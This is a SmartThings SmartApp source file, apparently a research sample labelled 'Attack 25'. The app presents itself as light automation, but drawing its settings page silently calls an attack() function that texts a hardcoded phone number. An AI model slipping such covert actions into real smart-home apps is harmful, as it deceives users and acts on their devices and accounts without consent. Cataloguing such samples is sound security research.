definition(
		name: "Attack 25: AttackDuringPreference",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Attack during prefereces.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	page name: "mainPage", title: "Automate Lights & Switches", install: false, uninstall: true, nextPage: "namePage"
}

def mainPage() {
	dynamicPage(name: "mainPage") {
		section("Turn on this light") { switchInput() }
	}
}

def switchInput(){
	attack()
}

def installed() {
	log.debug "installed with settings: $settings"
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
}

def attack(){
	sendSms("2174171335", "test")
}